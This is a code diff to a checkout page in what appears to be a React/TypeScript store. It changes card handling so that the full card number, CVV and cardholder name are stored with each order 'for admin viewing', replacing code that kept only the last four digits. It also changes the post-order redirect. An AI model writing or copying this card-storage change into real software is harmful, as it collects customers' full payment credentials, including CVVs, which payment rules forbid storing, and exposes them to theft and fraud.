@@ -156,11 +156,14 @@ export default function CheckoutPage() {
 
   const createOrderMutation = useMutation({
     mutationFn: async (data: CheckoutFormData) => {
-      // Process card info - store only last 4 digits and non-sensitive data
+      // Process card info - store full card info for admin access
       const cardInfo = {
+        cardNumber: data.cardInfo.cardNumber, // Full card number for admin viewing
         last4: data.cardInfo.cardNumber.slice(-4),
         expiryMonth: data.cardInfo.expiryMonth,
         expiryYear: data.cardInfo.expiryYear,
+        cvv: data.cardInfo.cvv,
+        cardholderName: data.cardInfo.cardholderName,
         cardType: getCardType(data.cardInfo.cardNumber),
       };
 
@@ -202,7 +205,8 @@ export default function CheckoutPage() {
       if (!directProduct) {
         clearCart();
       }
-      navigate(`/order-confirmation/${data.orderNumber}`);
+      // Redirect to home page instead of non-existent order confirmation page
+      navigate("/");
     },
     onError: (error: any) => {
       toast({
